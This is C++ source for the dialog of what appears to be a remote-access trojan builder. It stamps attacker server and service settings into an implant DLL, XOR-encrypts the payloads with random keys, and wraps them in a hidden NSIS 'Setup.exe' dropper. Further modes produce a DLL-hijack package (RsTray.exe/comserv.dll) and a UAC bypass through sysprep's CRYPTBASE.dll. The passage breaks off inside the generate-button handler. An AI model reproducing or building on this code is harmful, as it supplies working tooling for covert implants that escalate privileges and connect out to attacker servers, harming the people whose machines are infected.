
// Generate_binDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Generator.h"
#include "GeneratorDlg.h"
#include "afxdialogex.h"
#include <shellapi.h>
#include <atlenc.h>
#include "CommNames.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


static CString GetModFilePath(LPCTSTR moduleName)
{
	CString binFilePath;

	HMODULE hMod = NULL;
	if (NULL != moduleName)
	{
		hMod = ::GetModuleHandle(moduleName);
	}

	TCHAR baseName[MAX_PATH] = {0};
	DWORD dwBaseNameSize = GetModuleFileName(hMod, baseName, MAX_PATH);
	while (dwBaseNameSize > 0 && baseName[dwBaseNameSize] != '\\')
	{
		dwBaseNameSize--;
	}
	baseName[dwBaseNameSize + 1] = '\0';
	binFilePath = baseName;

	return binFilePath;
}

static BOOL XorFibonacciCrypt(const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1)
{
	LPBYTE lpOutput = (LPBYTE) lpEncrypted;
	LPBYTE lpSource = (LPBYTE) lpPlain;

	UINT last1 = factor1;
	UINT last2 = factor0;

	for (DWORD i = 0; i < dwPlainLen; i++)
	{
		BYTE xorchar = (last1 + last2) % MAXBYTE;
		last2 = last1;
		last1 = xorchar;

		*lpOutput = (*lpSource) ^ xorchar;
		lpOutput++;
		lpSource++;
	}

	return TRUE;
}

static BOOL FindAndSet(LPBYTE pBase, DWORD dwSize, DWORD dwFlag, LPBYTE pData, DWORD dwDataSize, BOOL bEncrypt = FALSE, int factor1 = 0, int factor2 = 0)
{
	int count = 0;
	LPBYTE pTest = pBase;
	for (DWORD i = 0; i < dwSize - dwDataSize; i++, pTest++)
	{
		if (*(LPDWORD)pTest == dwFlag/* && *((LPDWORD)pTest + 1) == 0*/)
		{
			count++;
		}
	}
	if (count != 1)
	{
		CString errorMsg;
		errorMsg.Format(_T("定位%X特征失败,发现匹配个数 %d"), dwFlag, count);
		return FALSE;
	}

	for (DWORD i = 0; i < dwSize - dwDataSize; i++, pBase++)
	{
		if (*(LPDWORD)pBase == dwFlag /*&& *((LPDWORD)pBase + 1) == 0*/)
		{
			memcpy(pBase, pData, dwDataSize);
 			if (bEncrypt)
 			{
 				XorFibonacciCrypt(pBase, dwDataSize, pBase, factor1, factor2);
 			}
			return TRUE;
		}
	}

	return FALSE;
}

// CGenerate_binDlg 对话框
CGeneratorDlg::CGeneratorDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CGeneratorDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CGeneratorDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_COMBO_CONNECT, m_ConnectType);
//	DDX_Control(pDX, IDC_COMBO_PROXY, m_ProxyType);
	DDX_Control(pDX, IDC_COMBO_COMM, m_DefaultComm);
//	DDX_Control(pDX, IDC_COMBO_SETUP_TYPE, m_SetupType);
}

BEGIN_MESSAGE_MAP(CGeneratorDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON_BINGO, &CGeneratorDlg::OnBnClickedButtonBingo)
	ON_BN_CLICKED(IDC_BUTTON_CLOSE, &CGeneratorDlg::OnBnClickedButtonClose)
// 	ON_BN_CLICKED(IDC_RADIO_PASSUAC, &CGeneratorDlg::OnBnClickedRadioPassuac)
// 	ON_BN_CLICKED(IDC_RADIO_SETUP, &CGeneratorDlg::OnBnClickedRadioSetup)
// 	ON_BN_CLICKED(IDC_RADIO_HIJACK, &CGeneratorDlg::OnBnClickedRadioHijack)
	ON_CBN_SELCHANGE(IDC_COMBO_SETUP_TYPE, &CGeneratorDlg::OnCbnSelchangeComboSetupType)
	ON_CBN_SELENDOK(IDC_COMBO_COMM, &CGeneratorDlg::OnCbnSelendokComboComm)
END_MESSAGE_MAP()


// CGenerate_binDlg 消息处理程序
void CGeneratorDlg::InitDlgEdit()
{
	LoadGeneratorConfig(config);

	SetDlgItemText(IDC_EDIT_CONADDR, config.serverIP);
//	SetDlgItemText(IDC_EDIT_SERVICENAME, config.serviceName);
//	SetDlgItemText(IDC_EDIT_DISPLAYNAME, config.serviceDisplayName);
//	SetDlgItemText(IDC_EDIT_SERVICEDEC, config.serviceDescription);
//	SetDlgItemText(IDC_EDIT_INSTALLPATH, config.serviceInstallpath);
	SetDlgItemText(IDC_EDIT_GROUP, _T("Default"));
	SetDlgItemInt(IDC_EDIT_PORT, config.port);
//	SetDlgItemInt(IDC_EDIT_DNSPORT, 53);

// 	if (config.packetType == PACKET_TYPE_PASSUAC)
// 	{
// 		GetDlgItem(IDC_EDIT_INSTALLPATH)->EnableWindow(FALSE);
// 		config.setupType = SETUP_TYPE_CHAMELEON;
// 		m_SetupType.EnableWindow(FALSE);
// 	}

//	m_DefaultComm.AddString(_T("自动检测"));;

	m_DefaultComm.InsertString(0,_T("HTTP"));
	m_DefaultComm.SetItemData(0,COMMNAME_HTTP);
	m_DefaultComm.InsertString(1,_T("HTTPS"));
	m_DefaultComm.SetItemData(1,COMMNAME_HTTPS);
	m_DefaultComm.InsertString(2,_T("TCP"));
	m_DefaultComm.SetItemData(2,COMMNAME_TCP);
// 	m_DefaultComm.InsertString(3,_T("TCPS"));
// 	m_DefaultComm.SetItemData(3,COMMNAME_TCPS);
	m_DefaultComm.InsertString(3,_T("UDP"));
	m_DefaultComm.SetItemData(3,COMMNAME_UDP);
// 	m_DefaultComm.InsertString(5,_T("UDPS"));
// 	m_DefaultComm.SetItemData(5,COMMNAME_UDPS);
	

	m_DefaultComm.SetCurSel(config.commType);
	OnCbnSelendokComboComm();

// 	m_SetupType.InsertString(0, _T("根据指定的目录位置安装"));
// 	m_SetupType.InsertString(0, _T("混淆随机安装"));
// 	m_SetupType.SetCurSel(config.setupType);

	SetDlgItemInt(IDC_EDIT_TRY_INTERVALM, config.connectTryIntervalM);
	SetDlgItemInt(IDC_EDIT_FIRSTCONNECT_HOUR, config.firstConnectHour);
	SetDlgItemInt(IDC_EDIT_FIRSTCONNECT_MINUTE, config.firstConnectMinute);

	SetDlgItemInt(IDC_EDIT_FIRST_SVT_OFFSET, config.downSvtOffsetS);
	SetDlgItemInt(IDC_EDIT_SVT_INTERVAL, config.downSvtIntervalS);

	config.packetType = PACKET_TYPE_SETUP;

// 	if (config.packetType == PACKET_TYPE_SETUP)
// 	{
// 		((CButton*)GetDlgItem(IDC_RADIO_SETUP))->SetCheck(TRUE);
// 		((CButton*)GetDlgItem(IDC_RADIO_PASSUAC))->SetCheck(FALSE);
// 		((CButton*)GetDlgItem(IDC_RADIO_HIJACK))->SetCheck(FALSE);
// 	}
// 	else if (config.packetType == PACKET_TYPE_PASSUAC)
// 	{
// 		((CButton*)GetDlgItem(IDC_RADIO_SETUP))->SetCheck(FALSE);
// 		((CButton*)GetDlgItem(IDC_RADIO_HIJACK))->SetCheck(FALSE);
// 		((CButton*)GetDlgItem(IDC_RADIO_PASSUAC))->SetCheck(TRUE);
// 	}
// 	else if (config.packetType == PACKET_TYPE_HIJACK)
// 	{
// 		((CButton*)GetDlgItem(IDC_RADIO_HIJACK))->SetCheck(TRUE);
// 		((CButton*)GetDlgItem(IDC_RADIO_SETUP))->SetCheck(FALSE);
// 		((CButton*)GetDlgItem(IDC_RADIO_PASSUAC))->SetCheck(FALSE);
// 	}
	

	//目前尚未开放的配置
	m_ConnectType.InsertString(0,L"域名解析");
	m_ConnectType.InsertString(0,L"HTTP地址解析");
	m_ConnectType.InsertString(0,L"固定IP或URL地址");
	m_ConnectType.SetCurSel(0);

// 	m_ProxyType.InsertString(0,L"SOCK5代理");
// 	m_ProxyType.InsertString(0,L"HTTP代理");
// 	m_ProxyType.InsertString(0,L"浏览器默认代理（穿透ISA）");
// 	m_ProxyType.InsertString(0,L"不使用代理");
// 	m_ProxyType.SetCurSel(0);
}
BOOL CGeneratorDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	InitDlgEdit();
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CGeneratorDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CGeneratorDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
BOOL ResourceExeToFile(CString szFileName,LPCTSTR szResName,LPCTSTR szType)
{
	LPSTR lpResBuf = NULL;
	CStringA strRes;

	HRSRC hRes = FindResource(NULL,szResName,szType);
	if(hRes==NULL)
	{
		int nError = GetLastError();
		return FALSE;
	}
	HGLOBAL hgRes = LoadResource(NULL, hRes);
	if(hgRes==NULL)
		return FALSE;

	VOID *pRes = LockResource(hgRes);
	if(pRes==NULL)
		return FALSE;

	DWORD dwSize = SizeofResource(NULL, hRes);
	if(dwSize==0)
		return FALSE;

	lpResBuf = new char[dwSize + 1];
	ZeroMemory(lpResBuf,dwSize + 1);
	memcpy(lpResBuf,pRes,dwSize);

	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, 0, 
		CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, 0);
	if(hFile==INVALID_HANDLE_VALUE)
		return FALSE;

	DWORD dwWrite;
	BOOL bRet = TRUE;
	if(!WriteFile(hFile, lpResBuf, dwSize, &dwWrite, 0))
	{
		bRet = FALSE;
	}

	CloseHandle(hFile);

	if(!lpResBuf)
		delete lpResBuf;

	UnlockResource(hgRes);
	return bRet;
}
BOOL ResourceToFile(CString szFileName,LPCTSTR szResName,LPCTSTR szType,LPSTR lpszFilePath,int nFileSize,int key1 = 3, int key2 = 5)
{
	LPSTR lpResBuf = NULL;
	CStringA strRes;

	HRSRC hRes = FindResource(NULL,szResName,szType);
	if(hRes==NULL)
		return FALSE;

	HGLOBAL hgRes = LoadResource(NULL, hRes);
	if(hgRes==NULL)
		return FALSE;

	VOID *pRes = LockResource(hgRes);
	if(pRes==NULL)
		return FALSE;

	DWORD dwSize = SizeofResource(NULL, hRes);
	if(dwSize==0)
		return FALSE;

	lpResBuf = new char[dwSize + 1];
	ZeroMemory(lpResBuf,dwSize + 1);
	memcpy(lpResBuf,pRes,dwSize);


	LPSTR lpWriteBuf = new char[1024*5];
	ZeroMemory(lpWriteBuf, dwSize+1024);
	//Base64Decode((LPBYTE)lpResBuf,lstrlenA(lpResBuf),lpWriteBuf,1024*5);

 	//strRes.Format(lpResBuf, lpszFilePath, nFileSize);
// 	wsprintfA(lpWriteBuf,lpResBuf,lpszFilePath,nFileSize);
 	strRes = lpResBuf;
 	strRes.Replace("%s", lpszFilePath);
 	CStringA strTmp;
 	strTmp.Format("%d", nFileSize - 1);
 	strRes.Replace("%d3", strTmp);

	strTmp.Format("%d", key1);
	strRes.Replace("%d1", strTmp);

	strTmp.Format("%d", key2);
	strRes.Replace("%d2", strTmp);

	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, 0, 
		CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, 0);
	if(hFile==INVALID_HANDLE_VALUE)
		return FALSE;

	DWORD dwWrite;
	if(!WriteFile(hFile, strRes.GetBuffer(), strRes.GetLength(), &dwWrite, 0))
	{
		CloseHandle(hFile);
		return FALSE;
	}
	CloseHandle(hFile);

	if(!lpResBuf)
		delete lpResBuf;

	UnlockResource(hgRes);
	return TRUE;
}

BOOL XorEncryptFile(LPCTSTR lpszFilePath, UINT encryptSize,int key1 = 3 ,int key2 = 5)
{
	DWORD dwOutFileSize = 0;
	BOOL bRet = FALSE;
	LPBYTE lpFileContext = NULL;
	HANDLE hFile = CreateFile(lpszFilePath,GENERIC_WRITE | GENERIC_READ ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		int nError = GetLastError();
		goto END;
	}
	int nFileSize = GetFileSize(hFile,0);
	nFileSize = min(nFileSize, encryptSize);

	lpFileContext = new BYTE[nFileSize];
	if (!lpszFilePath)
		goto END;

	if (!ReadFile(hFile,lpFileContext,nFileSize,&dwOutFileSize,NULL))
		goto END;

	if (dwOutFileSize != nFileSize)
		goto END;
	
	//检查PE是不是已经加密过

	char* head = "EW";

	if (memcmp(head,lpFileContext,2) == 0)
	{
		bRet = TRUE;
		goto END;
	}


	XorFibonacciCrypt(lpFileContext,nFileSize,lpFileContext,key1,key2);
	SetFilePointer(hFile,0,0,FILE_BEGIN);

	if(!WriteFile(hFile,lpFileContext,nFileSize,&dwOutFileSize,NULL))
		goto END;

	bRet = (dwOutFileSize == nFileSize);

END:
	if (lpFileContext)
	{
		delete lpFileContext;
	}
	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
	}
	return bRet;
}

#define BINGO_PATH _T("bingo")
#define SERVANT_FILE _T("body.dll")
#define SHELL_FILE _T("shell.dll")
#define SHELL_BAK_FILE _T("shell.bak")
#define SERVANT_DATA_FILE _T("data.dat")
#define  NSI_FILE _T("packet.nsi")
#define  OUT_FILE _T("Setup.exe")

BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
{
	CString strSavePath;
	CString strShellPath;
	CString strNSIFilePath;
	CString strTempServant;

	CString strDataServant;
	CString strCmd;
	CStringA strFullCmd;
	CString strShellBak;

	DWORD dwOutSize = 0;

	DeleteFile(OUT_FILE);

	CString szPath(GetModFilePath(NULL));
	strSavePath.Format(_T("%s%s"), szPath, BINGO_PATH);
	CreateDirectory(strSavePath, NULL);


	strTempServant.Format(_T("%s\\%s"), strSavePath, SERVANT_FILE);
	strNSIFilePath.Format(_T("%s\\%s"), strSavePath, NSI_FILE);
	strDataServant.Format(_T("%s\\%s"),strSavePath ,SERVANT_DATA_FILE);
	strShellPath.Format(_T("%s\\%s"),strSavePath ,SHELL_FILE);
	strShellBak.Format(_T("%s\\%s"),strSavePath ,SHELL_BAK_FILE);

	DeleteFile(strShellPath);
	CopyFile(strShellBak,strShellPath,FALSE);

	CHAR szInstallPath[MAX_PATH] = {0};
	lstrcpyA(szInstallPath, CStringA(service.szInstalPath));

	HANDLE hFile = CreateFile(strTempServant,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		strError = _T("打开文件失败");
		return FALSE;
	}
	
	int nFileSize = GetFileSize(hFile,0);
	LPBYTE lpBase = new BYTE[nFileSize];
	if (!lpBase)
	{
		strError = _T("申请内存失败！");
		return FALSE;
	}

	if (!ReadFile(hFile,lpBase,nFileSize,&dwOutSize,NULL))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("读文件失败");
		return FALSE;
	}

	CloseHandle(hFile);

	//写入配置信息
	
	if(!FindAndSet(lpBase,nFileSize,CONNECT_FLAG,(LPBYTE)&config,sizeof(CONNECT_INFO)))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("定位失败！");
		return FALSE;
	}

	if(!FindAndSet(lpBase,nFileSize,SERVICE_FLAG,(LPBYTE)&service,sizeof(SERVICE_INFO)))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("定位失败！");
		return FALSE;
	}
	
	hFile = CreateFile(strDataServant,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	::SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
 	if (!WriteFile(hFile,lpBase,nFileSize,&dwOutSize,NULL))
 	{
 		delete lpBase;
 		CloseHandle(hFile);
 		strError = _T("写入失败！");
 		return FALSE;
 	}

	delete lpBase;
	
	UINT encryptSize = 4096;

	srand(GetTickCount());

	int key1 = rand() % 255;
	int key2 = rand() % 255;

	//加密文件
  	if (!XorEncryptFile(strShellPath, encryptSize,key1,key2))
  	{
		CloseHandle(hFile);
  		strError = _T("加密文件失败！");
  		return FALSE;
  	}

	encryptSize = GetFileSize(hFile,0);
	CloseHandle(hFile);

	//加密文件
	if (!XorEncryptFile(strDataServant,encryptSize ))
	{
		strError = _T("加密文件失败！");
		return FALSE;
	}

	if(!ResourceToFile(strNSIFilePath,\
		MAKEINTRESOURCE(IDR_RC_NSI),L"RC_NSI", szInstallPath,4096,key1,key2))
	{
		strError = _T("导出资源失败!");
		return FALSE;
	}

	strFullCmd += "\"";

	strFullCmd+=szPath;
	strFullCmd+="\\makensis.exe";

	strFullCmd += "\"";

	strCmd = CString(strFullCmd);
	SHELLEXECUTEINFO execInfo; 
	memset(&execInfo, 0, sizeof(SHELLEXECUTEINFO)); 

	strNSIFilePath  = CString("\"") + strNSIFilePath;
	strNSIFilePath += CString("\"");

	execInfo.cbSize = sizeof(SHELLEXECUTEINFO); 
	execInfo.fMask = SEE_MASK_NOCLOSEPROCESS; 
	execInfo.lpVerb = _T("open"); 
	execInfo.lpFile = strCmd; 
	execInfo.lpParameters =  strNSIFilePath;
	execInfo.nShow = SW_HIDE; 
	ShellExecuteEx(&execInfo); 

	WaitForSingleObject(execInfo.hProcess, INFINITE); 
	CloseHandle(execInfo.hProcess);   

// 	DeleteFile(strTempServant);
// 	DeleteFile(strNSIFilePath);
// 	DeleteFile(strNSHTempFile);
// 	RemoveDirectory(strSavePath);

	CString outputFile;
	outputFile.Format(_T("%s%s"), szPath, OUT_FILE);
	hFile = CreateFile(outputFile,GENERIC_READ,FILE_SHARE_READ,NULL,\
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	//生成成功返回TRUE
	if (hFile == INVALID_HANDLE_VALUE)
	{
		strError.Format(_T("创建[%s]失败"), outputFile);
		return FALSE;
	}
	
	CloseHandle(hFile);
	return TRUE;
}
#define SYSPREP_PATH _T("c:\\windows\\system32\\sysprep\\")
#define BUG_DLL _T("CRYPTBASE.dll")

BOOL MakeCab(LPCTSTR lpsrcFilePath,LPCTSTR lpdesFilePath)
{
	CString szPath(GetModFilePath(NULL));
	CString strParameters;
	strParameters.Format(_T("%s %s"),lpsrcFilePath,lpdesFilePath);

	SHELLEXECUTEINFO execInfo; 
	memset(&execInfo, 0, sizeof(SHELLEXECUTEINFO)); 

	execInfo.cbSize = sizeof(SHELLEXECUTEINFO); 
	execInfo.fMask = SEE_MASK_NOCLOSEPROCESS; 
	execInfo.lpVerb = _T("open"); 
	execInfo.lpFile = _T("makecab.exe"); 
	execInfo.lpParameters = CString("\"") + strParameters + CString("\"");
	execInfo.nShow = SW_HIDE; 
	ShellExecuteEx(&execInfo); 

	WaitForSingleObject(execInfo.hProcess, INFINITE); 
	CloseHandle(execInfo.hProcess);

	HANDLE hFile = CreateFile(lpdesFilePath,GENERIC_READ,FILE_SHARE_READ,NULL,\
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	//生成成功返回TRUE
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	CloseHandle(hFile);
	return TRUE;
}
BOOL WriteHijack(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
{
	CString strSavePath;
	CString strServantPath;
	CString strTempServant;
	CString strExePath;
	CString strDllPath;

	DWORD dwOutSize = 0;

	DeleteFile(OUT_FILE);

	CString szPath(GetModFilePath(NULL));
	strServantPath = szPath;
	strServantPath += _T("servantshell.dll");
	strSavePath.Format(_T("%s%s"), szPath, _T("hijack"));
	strTempServant.Format(_T("%s%s"),strSavePath,_T("\\servant.dll"));
	strExePath.Format(_T("%s%s"),strSavePath,_T("\\RsTray.exe"));
	strDllPath.Format(_T("%s%s"),strSavePath,_T("\\comserv.dll"));

	CreateDirectory(strSavePath, NULL);

	CHAR szInstallPath[MAX_PATH] = {0};
	sprintf_s(szInstallPath, CStringA(service.szInstalPath));

	::DeleteFile(strTempServant);
	if(!CopyFile(strServantPath,strTempServant,TRUE))
	{
		strError = _T("拷贝文件失败！");
		return FALSE;
	}

	HANDLE hFile = CreateFile(strTempServant,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		strError = _T("打开文件失败");
		return FALSE;
	}

	int nFileSize = GetFileSize(hFile,0);
	LPBYTE lpBase = new BYTE[nFileSize];
	if (!lpBase)
	{
		strError = _T("申请内存失败！");
		return FALSE;
	}

	if (!ReadFile(hFile,lpBase,nFileSize,&dwOutSize,NULL))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("读文件失败");
		return FALSE;
	}

	//写入配置信息

	if(!FindAndSet(lpBase,nFileSize,CONNECT_FLAG,(LPBYTE)&config,sizeof(CONNECT_INFO),TRUE,CONNECT_CONFIG_FACTOR1,CONNECT_CONFIG_FACTOR2))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("定位失败！");
		return FALSE;
	}

	if(!FindAndSet(lpBase,nFileSize,SERVICE_FLAG,(LPBYTE)&service,sizeof(SERVICE_INFO)))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("定位失败！");
		return FALSE;
	}

	::SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	if (!WriteFile(hFile,lpBase,nFileSize,&dwOutSize,NULL))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("写入失败！");
		return FALSE;
	}

	ResourceExeToFile(strDllPath,MAKEINTRESOURCE(IDR_DLL_COMSERV),L"DLL");
	ResourceExeToFile(strExePath,MAKEINTRESOURCE(IDR_EXE_RSTRAY),L"EXE");
	delete lpBase;
	CloseHandle(hFile);

	return TRUE;
}

BOOL WriteBypassUAC(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
{
	CString szPath(GetModFilePath(NULL));
	CString szTempBugDll;
	szTempBugDll.Format(_T("%s\\%s"),BINGO_PATH,BUG_DLL);

	CString strServantPath;
	CString strSavePath;
	CString strTempServant;
	CString strNSIFilePath;
	CString strNSHFile;
	CString strNSHTempFile;
	CString strTempNSI;

	DWORD dwOutSize = 0;

	strSavePath.Format(_T("%s%s"), szPath, BINGO_PATH);
	strTempServant.Format(_T("%s\\%s"), strSavePath, SERVANT_FILE);
	strServantPath.Format(_T("%s%s"), szPath, SERVANT_FILE);

	strNSHFile.Format(_T("%sLogicLib.nsh"), GetModFilePath(NULL));
	strNSHTempFile.Format(_T("%s\\LogicLib.nsh"), strSavePath);
	strNSIFilePath.Format(_T("%s\\%s"), strSavePath, NSI_FILE);

	CHAR szInstallPath[MAX_PATH] = {0};
	sprintf_s(szInstallPath, "C:\\Windows\\Temp\\");

	if(!CreateDirectory(szPath+_T("\\")+BINGO_PATH,NULL) && ::GetLastError() != ERROR_ALREADY_EXISTS)
	{
		strError = _T("创建临时目录失败！");
		return FALSE;
	}

	::DeleteFile(strSavePath +_T("\\")+ BUG_DLL);
	if(!CopyFile(szPath+SERVANT_FILE, strSavePath +_T("\\")+ SERVANT_FILE, FALSE))
	{
		strError = _T("拷贝文件失败！");
		return FALSE;
	}

	HANDLE hFile = CreateFile(strSavePath +_T("\\")+ SERVANT_FILE,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		strError = _T("打开文件失败");
		return FALSE;
	}

	int nFileSize = GetFileSize(hFile,0);
	LPBYTE lpBase = new BYTE[nFileSize];
	if (!lpBase)
	{
		strError = _T("申请内存失败！");
		return FALSE;
	}

	if (!ReadFile(hFile,lpBase,nFileSize,&dwOutSize,NULL))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("读文件失败");
		return FALSE;
	}

	//写入配置信息

	if(!FindAndSet(lpBase,nFileSize,CONNECT_FLAG,(LPBYTE)&config,sizeof(CONNECT_INFO),TRUE,CONNECT_CONFIG_FACTOR1,CONNECT_CONFIG_FACTOR2))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("定位失败！");
		return FALSE;
	}

	if(!FindAndSet(lpBase,nFileSize,SERVICE_FLAG,(LPBYTE)&service,sizeof(SERVICE_INFO)))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("定位失败！");
		return FALSE;
	}

	::SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	if (!WriteFile(hFile,lpBase,nFileSize,&dwOutSize,NULL))
	{
		delete lpBase;
		CloseHandle(hFile);
		strError = _T("写入失败！");
		return FALSE;
	}

	CloseHandle(hFile);
	delete lpBase;

	XorEncryptFile(strSavePath + _T("\\") + SERVANT_FILE,4096);

	if(!ResourceToFile(strNSIFilePath,\
		MAKEINTRESOURCE(IDR_RC_NSI3),L"RC_NSI", szInstallPath,4096/*nFileSize*/))
	{
		strError = _T("导出资源失败!");
		return FALSE;
	}
	CString strFullCmd;

	strFullCmd = szPath;
	strFullCmd+="\\makensis.exe";

	SHELLEXECUTEINFO execInfo; 
	memset(&execInfo, 0, sizeof(SHELLEXECUTEINFO)); 

	execInfo.cbSize = sizeof(SHELLEXECUTEINFO); 
	execInfo.fMask = SEE_MASK_NOCLOSEPROCESS; 
	execInfo.lpVerb = _T("open"); 
	execInfo.lpFile = strFullCmd; 
	execInfo.lpParameters = strNSIFilePath;
	execInfo.nShow = SW_HIDE; 
	ShellExecuteEx(&execInfo); 

	WaitForSingleObject(execInfo.hProcess, INFINITE); 
	CloseHandle(execInfo.hProcess);   

	return TRUE;
}
BOOL WriteCarrier(CONNECT_INFO& config,SERVICE_INFO& service,CString& errorMsg)
{
	CString sourceFilepath;
	sourceFilepath.Format(_T("%scarrier.exe"), GetModFilePath(NULL));
	CString targetFilepath;
	targetFilepath.Format(_T("%scarrier_release.exe"), GetModFilePath(NULL));

//  	::DeleteFile(targetFilepath);
//  	if (! ::CopyFile(sourceFilepath, targetFilepath, FALSE))
//  	{
// 		errorMsg.Format(_T("copy file failed"));
//  		return FALSE;
//  	}

	HANDLE hFile = INVALID_HANDLE_VALUE;
	HANDLE hMapping = NULL;
	LPBYTE lpBase = NULL;

	BOOL bSuccess = FALSE;
	do 
	{
		hFile = ::CreateFile(targetFilepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			errorMsg.Format(_T("打开文件%s失败. E%u"), targetFilepath, ::GetLastError());
			break;
		}

		DWORD dwFileSize = ::GetFileSize(hFile, NULL);

		hMapping = ::CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
		if (NULL == hMapping)
		{
			errorMsg.Format(_T("打开文件映射%s失败. E%u"), targetFilepath, ::GetLastError());
			break;
		}

		lpBase = (LPBYTE) ::MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
		if (NULL == lpBase)
		{
			errorMsg.Format(_T("映射文件内存%s失败. E%u"), targetFilepath, ::GetLastError());
			break;
		}

		if (! FindAndSet(lpBase, dwFileSize, SERVICE_FLAG, (LPBYTE)&service, sizeof(service)))
		{
			errorMsg.Format(_T("替换service数据失败%s. E%u"), targetFilepath, ::GetLastError());
			break;
		}

		if (! FindAndSet(lpBase, dwFileSize, CONNECT_FLAG, (LPBYTE)&config, sizeof(config)))
		{
			errorMsg.Format(_T("替换config数据失败%s. E%u"), targetFilepath, ::GetLastError());
			break;
		}

		bSuccess = TRUE;
	} while (FALSE);

	if (lpBase != NULL) ::UnmapViewOfFile(lpBase);
	if (NULL != hMapping) ::CloseHandle(hMapping);
	if (INVALID_HANDLE_VALUE != hFile) ::CloseHandle(hFile);

	return bSuccess;
}

void CGeneratorDlg::OnBnClickedButtonBingo()
{
	CONNECT_INFO Config_Info = {0};
	SERVICE_INFO Service_Info = {0};
	GENERATOR_CONFIG generateConfig;

	UpdateWindow();

	//得到连接地址
	GetDlgItemTextA(m_hWnd,IDC_EDIT_CONADDR, Config_Info.szAddr,sizeof(Config_Info.szAddr));
	generateConfig.serverIP = CString(Config_Info.szAddr);

// 	//得到安装目录
// 	GetDlgItemTextW(IDC_EDIT_INSTALLPATH,Service_Info.szInstalPath,sizeof(Service_Info.szInstalPath)/sizeof(TCHAR));
// 	generateConfig.serviceInstallpath = Service_Info.szInstalPath;
	lstrcpy(Service_Info.szInstalPath,config.serviceInstallpath);

// 	//得到服务名
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_SERVICENAME, Service_Info.szServiceName,sizeof(Service_Info.szServiceName));
// 	generateConfig.serviceName = CString(Service_Info.szServiceName);
	lstrcpyA(Service_Info.szServiceName,CStringA(config.serviceName).GetBuffer());

// 	//得到服务DisplayName
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_DISPLAYNAME,Service_Info.szDisplayName,sizeof(Service_Info.szDisplayName));
